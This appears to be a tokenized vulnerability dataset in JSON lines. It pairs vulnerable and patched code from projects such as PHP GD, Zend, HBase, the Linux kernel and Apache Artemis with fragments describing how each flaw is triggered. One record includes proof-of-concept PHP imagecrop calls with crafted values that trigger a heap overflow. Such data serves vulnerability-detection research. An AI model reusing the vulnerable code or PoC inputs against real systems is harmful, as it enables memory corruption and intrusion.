"name", ">", "<", "value", ">", "true", "<", "/", "value", ">", "<", "/", "property", "></s>saslRpcClient", "=", "new", "HBaseSaslRpcClient", "(", "authMethod", ",", "token", ",", "serverPrincipal", ")", ";", "Token", "<", "?", "extends", "TokenIdentifier", ">", "token", ",", "String", "serverPrincipal", ")", "throws", "IOException", "{", "if", "(", "LOG", ".", "isDebugEnabled", "(", "))"], "docstring_tokens": ["using", "man-in-the-middle", "techniques"]}
{"contents": ["empty"], "code_tokens": ["zend_throw_error", "(", "exception_ce", ",", "\"", "%", "s", "\"", ",", "message", ")", ";</s>zend_throw_error", "(", "exception_ce", ",", "message", ")", ";"], "docstring_tokens": ["via", "format", "string", "specifiers", "in", "a", "string", "that", "is", "misused", "as", "a", "class", "name"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "*", "Careful", "here", ":", "User", "space", "might", "have", "asked", "for", "a", "*", "very", "long", "sleep", ",", "so", "the", "add", "above", "might", "result", "in", "a", "*", "negative", "number", ",", "which", "enqueues", "the", "timer", "in", "front", "*", "of", "the", "queue", ".", "*", "/", "if", "(", "tim", ".", "tv64", "<", "0", ")", "tim", ".", "tv64", "=", "KTIME_MAX", ";</s>"], "docstring_tokens": ["via", "a", "large", "relative", "timeout", "value", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "!", "thresholds", "-", ">", "primary", ")", "goto", "unlock", ";", "unlock", ":</s>"], "docstring_tokens": ["by", "registering", "memory", "threshold", "events", "."]}
{"contents": ["empty"], "code_tokens": [".", "Fixed", "bug", "#", "66356", "(", "Heap", "Overflow", "Vulnerability", "in", "imagecrop", "(", "))", ".", "(", "Laruence", ",", "Remi", ")", "/", "*", "check", "size", "*", "/", "if", "(", "crop", "-", ">", "width", "<", "=", "0", "|", "|", "crop", "-", ">", "height", "<", "=", "0", ")", "{", "return", "NULL", ";", "}", "/", "*", "allocate", "the", "requested", "size", "(", "could", "be", "only", "partially", "filled", ")", "*", "/", "if", "(", "dst", "=", "=", "NULL", ")", "{", "return", "NULL", ";", "}", "/", "*", "check", "position", "in", "the", "src", "image", "*", "/", "if", "(", "crop", "-", ">", "x", "<", "0", "|", "|", "crop", "-", ">", "x", ">", "=", "src", "-", ">", "sx", "|", "|", "crop", "-", ">", "y", "<", "0", "|", "|", "crop", "-", ">", "y", ">", "=", "src", "-", ">", "sy", ")", "{", "return", "dst", ";", "}", "/", "*", "reduce", "size", "if", "needed", "*", "/", "if", "(", "(", "src", "-", ">", "sx", "-", "crop", "-", ">", "width", ")", "<", "crop", "-", ">", "x", ")", "{", "crop", "-", ">", "width", "=", "src", "-", ">", "sx", "-", "crop", "-", ">", "x", ";", "if", "(", "(", "src", "-", ">", "sy", "-", "crop", "-", ">", "height", ")", "<", "crop", "-", ">", "y", ")", "{", "crop", "-", ">", "height", "=", "src", "-", ">", "sy", "-", "crop", "-", ">", "y", ";", "int", "y", "=", "crop", "-", ">", "y", ";", "if", "(", "src", "-", ">", "trueColor", ")", "{", "unsigned", "int", "dst_y", "=", "0", ";", "while", "(", "y", "<", "(", "crop", "-", ">", "y", "+", "(", "crop", "-", ">", "height", "-", "1", ")", "))", "{", "/", "*", "TODO", ":", "replace", "4", "w", "/", "byte", "per", "channel", "|", "|", "pitch", "once", "available", "*", "/", "memcpy", "(", "dst", "-", ">", "tpixels", "[", "dst_y", "+", "+]", ",", "src", "-", ">", "tpixels", "[", "y", "+", "+]", "+", "crop", "-", ">", "x", ",", "crop", "-", ">", "width", "*", "4", ")", ";", "}", "int", "x", ";", "for", "(", "y", "=", "crop", "-", ">", "y", ";", "y", "<", "(", "crop", "-", ">", "y", "+", "(", "crop", "-", ">", "height", "-", "1", ")", ");", "y", "+", "+)", "{", "for", "(", "x", "=", "crop", "-", ">", "x", ";", "x", "<", "(", "crop", "-", ">", "x", "+", "(", "crop", "-", ">", "width", "-", "1", ")", ");", "x", "+", "+)", "{", "dst", "-", ">", "pixels", "[", "y", "-", "crop", "-", ">", "y", "]", "[", "x", "-", "crop", "-", ">", "x", "]", "=", "src", "-", ">", "pixels", "[", "y", "]", "[", "x", "]", ";", "return", "dst", ";", "/", "/", "POC", "#", "1", "var_dump", "(", "imagecrop", "(", "$", "img", ",", "array", "(", "\"", "x", "\"", "=", ">", "\"", "a", "\"", ",", "\"", "y", "\"", "=", ">", "0", ",", "\"", "width", "\"", "=", ">", "10", ",", "\"", "height", "\"", "=", ">", "10", ")", "))", ";", "var_dump", "(", "imagecrop", "(", "$", "img", ",", "$", "arr", ")", ");", "/", "/", "POC", "#", "2", "var_dump", "(", "imagecrop", "(", "$", "img", ",", "array", "(", "\"", "x", "\"", "=", ">", "0", ",", "\"", "y", "\"", "=", ">", "0", ",", "\"", "width", "\"", "=", ">", "-", "1", ",", "\"", "height", "\"", "=", ">", "10", ")", "))", ";", "/", "/", "POC", "#", "3", "var_dump", "(", "imagecrop", "(", "$", "img", ",", "array", "(", "\"", "x", "\"", "=", ">", "-", "20", ",", "\"", "y", "\"", "=", ">", "-", "20", ",", "\"", "width", "\"", "=", ">", "10", ",", "\"", "height", "\"", "=", ">", "10", ")", "))", ";", "/", "/", "POC", "#", "4", "var_dump", "(", "imagecrop", "(", "$", "img", ",", "array", "(", "\"", "x", "\"", "=", ">", "0x7fffff00", ",", "\"", "y", "\"", "=", ">", "0", ",", "\"", "width", "\"", "=", ">", "10", ",", "\"", "height", "\"", "=", ">", "10", ")", "))", ";", "resource", "(", "%", "d", ")", "of", "type", "(", "gd", ")", "resource", "(", "%", "d", ")", "of", "type", "(", "gd", ")", "bool", "(", "false", ")", "resource", "(", "%", "d", ")", "of", "type", "(", "gd", ")", "resource", "(", "%", "d", ")", "of", "type", "(", "gd", ")</s>-", "GD", ":", ".", "Fixed", "bug", "#", "66356", "(", "Heap", "Overflow", "Vulnerability", "in", "imagecrop", "(", "))", ".", "(", "Laruence", ")", "if", "(", "src", "-", ">", "sx", "<", "(", "crop", "-", ">", "x", "+", "crop", "-", ">", "width", "-", "1", ")", ")", "{", "crop", "-", ">", "width", "=", "src", "-", ">", "sx", "-", "crop", "-", ">", "x", "+", "1", ";", "if", "(", "src", "-", ">", "sy", "<", "(", "crop", "-", ">", "y", "+", "crop", "-", ">", "height", "-", "1", ")", ")", "{", "crop", "-", ">", "height", "=", "src", "-", ">", "sy", "-", "crop", "-", ">", "y", "+", "1", ";", "if", "(", "dst", "=", "=", "NULL", ")", "{", "return", "NULL", ";", "int", "y", "=", "crop", "-", ">", "y", ";", "if", "(", "src", "-", ">", "trueColor", ")", "{", "unsigned", "int", "dst_y", "=", "0", ";", "while", "(", "y", "<", "(", "crop", "-", ">", "y", "+", "(", "crop", "-", ">", "height", "-", "1", ")", "))", "{", "/", "*", "TODO", ":", "replace", "4", "w", "/", "byte", "per", "channel", "|", "|", "pitch", "once", "available", "*", "/", "memcpy", "(", "dst", "-", ">", "tpixels", "[", "dst_y", "+", "+]", ",", "src", "-", ">", "tpixels", "[", "y", "+", "+]", "+", "crop", "-", ">", "x", ",", "crop", "-", ">", "width", "*", "4", ")", ";", "}", "}", "else", "{", "int", "x", ";", "for", "(", "y", "=", "crop", "-", ">", "y", ";", "y", "<", "(", "crop", "-", ">", "y", "+", "(", "crop", "-", ">", "height", "-", "1", ")", ");", "y", "+", "+)", "{", "for", "(", "x", "=", "crop", "-", ">", "x", ";", "x", "<", "(", "crop", "-", ">", "x", "+", "(", "crop", "-", ">", "width", "-", "1", ")", ");", "x", "+", "+)", "{", "dst", "-", ">", "pixels", "[", "y", "-", "crop", "-", ">", "y", "]", "[", "x", "-", "crop", "-", ">", "x", "]", "=", "src", "-", ">", "pixels", "[", "y", "]", "[", "x", "]", ";", "}", "return", "dst", ";", "-", "-", "FILE", "$", "img", "=", "imagecrop", "(", "$", "img", ",", "array", "(", "\"", "x", "\"", "=", ">", "\"", "a", "\"", ",", "\"", "y", "\"", "=", ">", "0", ",", "\"", "width", "\"", "=", ">", "10", ",", "\"", "height", "\"", "=", ">", "10", ")", ");", "$", "img", "=", "imagecrop", "(", "$", "img", ",", "$", "arr", ")", ";", "-", "-", "EXPECTF"], "docstring_tokens": ["via", "an", "imagecrop", "function", "call", "with", "a", "large", "x", "dimension", "value"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "List", ";", "/", "**", "*", "Value", "used", "to", "indicate", "that", "all", "classes", "should", "be", "white", "or", "black", "listed", ",", "*", "/", "public", "static", "final", "String", "CATCH_ALL_WILDCARD", "=", "\"", "*\"", ";", "public", "static", "final", "String", "WHITELIST_PROPERTY", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "deserialization", ".", "whitelist", "\"", ";", "public", "static", "final", "String", "BLACKLIST_PROPERTY", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "deserialization", ".", "blacklist", "\"", ";", "private", "List", "<", "String", ">", "whiteList", "=", "new", "ArrayList", "<", ">(", ");", "private", "List", "<", "String", ">", "blackList", "=", "new", "ArrayList", "<", ">(", ");", "String", "whiteList", "=", "System", ".", "getProperty", "(", "WHITELIST_PROPERTY", ",", "null", ")", ";", "setWhiteList", "(", "whiteList", ")", ";", "String", "blackList", "=", "System", ".", "getProperty", "(", "BLACKLIST_PROPERTY", ",", "null", ")", ";", "setBlackList", "(", "blackList", ")", ";", "/", "**", "*", "@", "return", "the", "whiteList", "configured", "on", "this", "policy", "instance", ".", "*", "/", "public", "String", "getWhiteList", "(", ")", "{", "return", "StringUtil", ".", "joinStringList", "(", "whiteList", ",", "\"", ",\"", ");", "}", "/", "**", "*", "@", "return", "the", "blackList", "configured", "on", "this", "policy", "instance", ".", "*", "/", "public", "String", "getBlackList", "(", ")", "{", "return", "StringUtil", ".", "joinStringList", "(", "blackList", ",", "\"", ",\"", ");", "}", "/", "**", "*", "Replaces", "the", "currently", "configured", "whiteList", "with", "a", "comma", "separated", "*", "string", "containing", "the", "new", "whiteList", ".", "Null", "or", "empty", "string", "denotes", "*", "no", "whiteList", "entries", ",", "{", "@", "value", "#", "CATCH_ALL_WILDCARD", "}", "indicates", "that", "*", "all", "classes", "are", "whiteListed", ".", "*", "*", "@", "param", "whiteList", "the", "whiteList", "that", "this", "policy", "is", "configured", "to", "recognize", ".", "*", "/", "public", "void", "setWhiteList", "(", "String", "whiteList", ")", "{", "this", ".", "whiteList", "=", "StringUtil", ".", "splitStringList", "(", "whiteList", ",", "\"", ",\"", ");", "}", "/", "**", "*", "Replaces", "the", "currently", "configured", "blackList", "with", "a", "comma", "separated", "*", "string", "containing", "the", "new", "blackList", ".", "Null", "or", "empty", "string", "denotes", "*", "no", "blacklist", "entries", ",", "{", "@", "value", "#", "CATCH_ALL_WILDCARD", "}", "indicates", "that", "*", "all", "classes", "are", "blacklisted", ".", "*", "*", "@", "param", "blackList", "the", "blackList", "that", "this", "policy", "is", "configured", "to", "recognize", ".", "*", "/", "public", "void", "setBlackList", "(", "String", "blackList", ")", "{", "this", ".", "blackList", "=", "StringUtil", ".", "splitStringList", "(", "blackList", ",", "\"", ",\"", ");", "}", "clazz", "=", "super", ".", "resolveClass", "(", "desc", ")", ";", "return", "checkSecurity", "(", "clazz", ")", ";", "return", "checkSecurity", "(", "super", ".", "resolveClass", "(", "desc", ")", ");", "return", "checkSecurity", "(", "Proxy", ".", "getProxyClass", "(", "hasNonPublicInterface", "?", "nonPublicLoader", ":", "latestLoader", ",", "classObjs", ")", ");", "private", "Class", "<", "?>", "checkSecurity", "(", "Class", "<", "?>", "clazz", ")", "throws", "ClassNotFoundException", "{", "Class", "<", "?>", "target", "=", "clazz", ";", "while", "(", "target", ".", "isArray", "(", "))", "{", "target", "=", "target", ".", "getComponentType", "(", ");", "}", "while", "(", "target", ".", "isAnonymousClass", "(", ")", "|", "|", "target", ".", "isLocalClass", "(", "))", "{", "target", "=", "target", ".", "getEnclosingClass", "(", ");", "}", "if", "(", "!", "target", ".", "isPrimitive", "(", "))", "{", "if", "(", "!", "isTrustedType", "(", "target", ")", ")", "{", "throw", "new", "ClassNotFoundException", "(", "\"", "Forbidden", "\"", "+", "clazz", "+", "\"", "!", "\"", "\"", "This", "class", "is", "not", "trusted", "to", "be", "deserialized", "under", "the", "current", "configuration", ".", "\"", "\"", "Please", "refer", "to", "the", "documentation", "for", "more", "information", "on", "how", "to", "configure", "trusted", "classes", ".", "\")", ";", "}", "}", "return", "clazz", ";", "}", "private", "boolean", "isTrustedType", "(", "Class", "<", "?>", "clazz", ")", "{", "if", "(", "clazz", "=", "=", "null", ")", "{", "return", "true", ";", "}", "String", "className", "=", "clazz", ".", "getCanonicalName", "(", ");", "if", "(", "className", "=", "=", "null", ")", "{", "/", "/", "Shouldn", "'", "t", "happen", "as", "we", "pre", "-", "processed", "things", ",", "but", "just", "in", "case", ".", ".", "className", "=", "clazz", ".", "getName", "(", ");", "}", "for", "(", "String", "blackListEntry", ":", "blackList", ")", "{", "if", "(", "CATCH_ALL_WILDCARD", ".", "equals", "(", "blackListEntry", ")", ")", "{", "return", "false", ";", "}", "else", "if", "(", "isClassOrPackageMatch", "(", "className", ",", "blackListEntry", ")", ")", "{", "return", "false", ";", "}", "}", "for", "(", "String", "whiteListEntry", ":", "whiteList", ")", "{", "if", "(", "CATCH_ALL_WILDCARD", ".", "equals", "(", "whiteListEntry", ")", ")", "{", "return", "true", ";", "}", "else", "if", "(", "isClassOrPackageMatch", "(", "className", ",", "whiteListEntry", ")", ")", "{", "return", "true", ";", "}", "}", "/", "/", "Failing", "outright", "rejection", "or", "allow", "from", "above", "/", "/", "reject", "only", "if", "the", "whiteList", "is", "not", "empty", ".", "return", "whiteList", ".", "size", "(", ")", "=", "=", "0", ";", "}", "private", "boolean", "isClassOrPackageMatch", "(", "String", "className", ",", "String", "listEntry", ")", "{", "if", "(", "className", "=", "=", "null", ")", "{", "return", "false", ";", "}", "/", "/", "Check", "if", "class", "is", "an", "exact", "match", "of", "the", "entry", "if", "(", "className", ".", "equals", "(", "listEntry", ")", ")", "{", "return", "true", ";", "}", "/", "/", "Check", "if", "class", "is", "from", "a", "[", "sub", "-", "]", "package", "matching", "the", "entry", "int", "entryLength", "=", "listEntry", ".", "length", "(", ");", "if", "(", "className", ".", "length", "(", ")", ">", "entryLength", "&", "&", "className", ".", "startsWith", "(", "listEntry", ")", "&", "&", "'", ".'", "=", "=", "className", ".", "charAt", "(", "entryLength", ")", ")", "{", "return", "true", ";", "}", "return", "false", ";", "}", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "utils", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "List", ";", "public", "class", "StringUtil", "{", "/", "**", "*", "Convert", "a", "list", "of", "Strings", "into", "a", "single", "String", "*", "@", "param", "strList", "the", "string", "list", "*", "@", "param", "delimit", "the", "delimiter", "used", "to", "separate", "each", "string", "entry", "in", "the", "list", "*", "@", "return", "the", "converted", "string", "*", "/", "public", "static", "String", "joinStringList", "(", "List", "<", "String", ">", "strList", ",", "String", "delimit", ")", "{", "Iterator", "<", "String", ">", "entries", "=", "strList", ".", "iterator", "(", ");", "StringBuilder", "builder", "=", "new", "StringBuilder", "(", ");", "while", "(", "entries", ".", "hasNext", "(", "))", "{", "builder", ".", "append", "(", "entries", ".", "next", "(", "))", ";", "if", "(", "entries", ".", "hasNext", "(", "))", "{", "builder", ".", "append", "(", "delimit", ")", ";", "}", "}", "return", "builder", ".", "toString", "(", ");", "}", "/", "**", "*", "Convert", "a", "String", "into", "a", "list", "of", "String", "*", "@", "param", "strList", "the", "String", "*", "@", "param", "delimit", "used", "to", "separate", "items", "within", "the", "string", ".", "*", "@", "return", "the", "string", "list", "*", "/", "public", "static", "List", "<", "String", ">", "splitStringList", "(", "String", "strList", ",", "String", "delimit", ")", "{", "ArrayList", "<", "String", ">", "list", "=", "new", "ArrayList", "<", ">(", ");", "if", "(", "strList", "!", "=", "null", "&", "&", "!", "strList", ".", "isEmpty", "(", "))", "{", "list", ".", "addAll", "(", "Arrays", ".", "asList", "(", "strList", ".", "split", "(", "delimit", ")", "))", ";", "}", "return", "list", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "56", "@", "@", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "util", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "utils", ".", "StringUtil", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "List", ";", "public", "class", "StringUtilTest", "extends", "Assert", "{", "@", "Test", "public", "void", "testJoinStringList", "(", ")", "throws", "Exception", "{", "List", "<", "String", ">", "strList", "=", "new", "ArrayList", "<", ">(", ");", "strList", ".", "add", "(", "\"", "a", "\"", ");", "strList", ".", "add", "(", "\"", "bc", "\"", ");", "strList", ".", "add", "(", "\"", "def", "\"", ");", "String", "result", "=", "StringUtil", ".", "joinStringList", "(", "strList", ",", "\"", ",\"", ");", "assertEquals", "(", "\"", "a", ",", "bc", ",", "def", "\"", ",", "result", ")", ";", "List", "<", "String", ">", "newList", "=", "StringUtil", ".", "splitStringList", "(", "result", ",", "\"", ",\"", ");", "assertEquals", "(", "strList", ".", "size", "(", "),", "newList", ".", "size", "(", "))", ";", "String", "result2", "=", "StringUtil", ".", "joinStringList", "(", "newList", ",", "\"", ",\"", ");", "assertEquals", "(", "result", ",", "result2", ")", ";", "}", "@", "Test", "public", "void", "testSplitStringList", "(", ")", "throws", "Exception", "{", "String", "listStr", "=", "\"", "white", ",", "blue", ",", "yellow", ",", "green", "\"", ";", "List", "<", "String", ">", "result", "=", "StringUtil", ".", "splitStringList", "(", "listStr", ",", "\"", ",\"", ");", "assertEquals", "(", "4", ",", "result", ".", "size", "(", "))", ";", "assertEquals", "(", "\"", "white", "\"", ",", "result", ".", "get", "(", "0", ")", ");", "assertEquals", "(", "\"", "blue", "\"", ",", "result", ".", "get", "(", "1", ")", ");", "assertEquals", "(", "\"", "yellow", "\"", ",", "result", ".", "get", "(", "2", ")", ");", "assertEquals", "(", "\"", "green", "\"", ",", "result", ".", "get", "(", "3", ")", ");", "String", "result2", "=", "StringUtil", ".", "joinStringList", "(", "result", ",", "\"", ",\"", ");", "assertEquals", "(", "listStr", ",", "result2", ")", ";", "}", "}", "@", "@", "-", "130", ",", "15", "+", "130", ",", "20", "@", "@", "private", "final", "ConnectionFactoryOptions", "options", ";", "public", "ActiveMQConnection", "(", "final", "ConnectionFactoryOptions", "options", ",", "final", "String", "username", ",", "this", ".", "options", "=", "options", ";", "return", "new", "ActiveMQXASession", "(", "options", ",", "this", ",", "transacted", ",", "true", ",", "acknowledgeMode", ",", "session", ",", "type", ")", ";", "return", "new", "ActiveMQSession", "(", "options", ",", "this", ",", "transacted", ",", "false", ",", "acknowledgeMode", ",", "session", ",", "type", ")", ";", "public", "String", "getDeserializationBlackList", "(", ")", "{", "return", "this", ".", "factoryReference", ".", "getDeserializationBlackList", "(", ");", "}", "public", "String", "getDeserializationWhiteList", "(", ")", "{", "return", "this", ".", "factoryReference", ".", "getDeserializationWhiteList", "(", ");", "}", "public", "class", "ActiveMQConnectionFactory", "implements", "ConnectionFactoryOptions", ",", "Externalizable", ",", "Referenceable", ",", "ConnectionFactory", ",", "XAConnectionFactory", ",", "AutoCloseable", "{", "private", "String", "deserializationBlackList", ";", "private", "String", "deserializationWhiteList", ";", "public", "String", "getDeserializationBlackList", "(", ")", "{", "return", "deserializationBlackList", ";", "}", "public", "void", "setDeserializationBlackList", "(", "String", "blackList", ")", "{", "this", ".", "deserializationBlackList", "=", "blackList", ";", "}", "public", "String", "getDeserializationWhiteList", "(", ")", "{", "return", "deserializationWhiteList", ";", "}", "public", "void", "setDeserializationWhiteList", "(", "String", "whiteList", ")", "{", "this", ".", "deserializationWhiteList", "=", "whiteList", ";", "}", "connection", "=", "new", "ActiveMQXAConnection", "(", "this", ",", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQXAConnection", "(", "this", ",", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQXAConnection", "(", "this", ",", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQConnection", "(", "this", ",", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQConnection", "(", "this", ",", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQConnection", "(", "this", ",", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "return", "createMessage", "(", "message", ",", "session", ",", "null", ")", ";", "}", "public", "static", "ActiveMQMessage", "createMessage", "(", "final", "ClientMessage", "message", ",", "final", "ClientSession", "session", ",", "final", "ConnectionFactoryOptions", "options", ")", "{", "msg", "=", "new", "ActiveMQObjectMessage", "(", "message", ",", "session", ",", "options", ")", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "api", ".", "core", ".", "client", ".", "ClientSession", ";", "private", "final", "ConnectionFactoryOptions", "options", ";", "protected", "ActiveMQMessageConsumer", "(", "final", "ConnectionFactoryOptions", "options", ",", "final", "ActiveMQConnection", "connection", ",", "this", ".", "options", "=", "options", ";", "coreListener", "=", "listener", "=", "=", "null", "?", "null", ":", "new", "JMSMessageListenerWrapper", "(", "options", ",", "connection", ",", "session", ",", "consumer", ",", "listener", ",", "ackMode", ")", ";", "ClientSession", "coreSession", "=", "session", ".", "getCoreSession", "(", ");", "boolean", "needSession", "=", "ackMode", "=", "=", "Session", ".", "CLIENT_ACKNOWLEDGE", "|", "|", "ackMode", "=", "=", "ActiveMQJMSConstants", ".", "INDIVIDUAL_ACKNOWLEDGE", "|", "|", "coreMessage", ".", "getType", "(", ")", "=", "=", "ActiveMQObjectMessage", ".", "TYPE", ";", "jmsMsg", "=", "ActiveMQMessage", ".", "createMessage", "(", "coreMessage", ",", "needSession", "?", "coreSession", ":", "null", ",", "options", ")", ";", "private", "final", "ConnectionFactoryOptions", "options", ";", "final", "ClientSession", "clientSession", ",", "final", "ConnectionFactoryOptions", "options", ")", "throws", "JMSException", "{", "this", ".", "options", "=", "options", ";", "activeMQJmsMessage", "=", "new", "ActiveMQObjectMessage", "(", "(", "ObjectMessage", ")", "jmsMessage", ",", "clientSession", ",", "options", ")", ";", "private", "final", "ConnectionFactoryOptions", "options", ";", "protected", "ActiveMQObjectMessage", "(", "final", "ClientSession", "session", ",", "ConnectionFactoryOptions", "options", ")", "{", "this", ".", "options", "=", "options", ";", "protected", "ActiveMQObjectMessage", "(", "final", "ClientMessage", "message", ",", "final", "ClientSession", "session", ",", "ConnectionFactoryOptions", "options", ")", "{", "this", ".", "options", "=", "options", ";", "public", "ActiveMQObjectMessage", "(", "final", "ObjectMessage", "foreign", ",", "final", "ClientSession", "session", ",", "ConnectionFactoryOptions", "options", ")", "throws", "JMSException", "{", "this", ".", "options", "=", "options", ";", "try", "(", "ObjectInputStreamWithClassLoader", "ois", "=", "new", "ObjectInputStreamWithClassLoader", "(", "new", "ByteArrayInputStream", "(", "data", ")", "))", "{", "String", "blackList", "=", "getDeserializationBlackList", "(", ");", "if", "(", "blackList", "!", "=", "null", ")", "{", "ois", ".", "setBlackList", "(", "blackList", ")", ";", "}", "String", "whiteList", "=", "getDeserializationWhiteList", "(", ");", "if", "(", "whiteList", "!", "=", "null", ")", "{", "ois", ".", "setWhiteList", "(", "whiteList", ")", ";", "}", "private", "String", "getDeserializationBlackList", "(", ")", "{", "if", "(", "options", "=", "=", "null", ")", "{", "return", "null", ";", "}", "else", "{", "return", "options", ".", "getDeserializationBlackList", "(", ");", "}", "}", "private", "String", "getDeserializationWhiteList", "(", ")", "{", "if", "(", "options", "=", "=", "null", ")", "{", "return", "null", ";", "}", "else", "{", "return", "options", ".", "getDeserializationWhiteList", "(", ");", "}", "}", "private", "final", "ConnectionFactoryOptions", "options", ";", "protected", "ActiveMQQueueBrowser", "(", "final", "ConnectionFactoryOptions", "options", ",", "final", "ActiveMQQueue", "queue", ",", "this", ".", "options", "=", "options", ";", "msg", "=", "ActiveMQMessage", ".", "createMessage", "(", "next", ",", "session", ",", "options", ")", ";", "private", "final", "ConnectionFactoryOptions", "options", ";", "protected", "ActiveMQSession", "(", "final", "ConnectionFactoryOptions", "options", ",", "final", "ActiveMQConnection", "connection", ",", "this", ".", "options", "=", "options", ";", "return", "new", "ActiveMQObjectMessage", "(", "session", ",", "options", ")", ";", "ActiveMQObjectMessage", "msg", "=", "new", "ActiveMQObjectMessage", "(", "session", ",", "options", ")", ";", "return", "new", "ActiveMQMessageProducer", "(", "connection", ",", "producer", ",", "jbd", ",", "session", ",", "options", ")", ";", "public", "String", "getDeserializationBlackList", "(", ")", "{", "return", "connection", ".", "getDeserializationBlackList", "(", ");", "}", "public", "String", "getDeserializationWhiteList", "(", ")", "{", "return", "connection", ".", "getDeserializationWhiteList", "(", ");", "}", "ActiveMQMessageConsumer", "jbc", "=", "new", "ActiveMQMessageConsumer", "(", "options", ",", "connection", ",", "this", ",", "consumer", ",", "false", ",", "dest", ",", "selectorString", ",", "autoDeleteQueueName", ")", ";", "ActiveMQMessageConsumer", "jbc", "=", "new", "ActiveMQMessageConsumer", "(", "options", ",", "connection", ",", "this", ",", "consumer", ",", "noLocal", ",", "dest", ",", "selectorString", ",", "autoDeleteQueueName", ")", ";", "return", "new", "ActiveMQQueueBrowser", "(", "options", ",", "(", "ActiveMQQueue", ")", "jbq", ",", "filterString", ",", "session", ")", ";", "public", "ActiveMQXAConnection", "(", "final", "ConnectionFactoryOptions", "options", ",", "final", "String", "username", ",", "super", "(", "options", ",", "username", ",", "password", ",", "connectionType", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "sessionFactory", ")", ";", "protected", "ActiveMQXASession", "(", "final", "ConnectionFactoryOptions", "options", ",", "ActiveMQConnection", "connection", ",", "super", "(", "options", ",", "connection", ",", "transacted", ",", "xa", ",", "ackMode", ",", "session", ",", "sessionType", ")", ";", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", 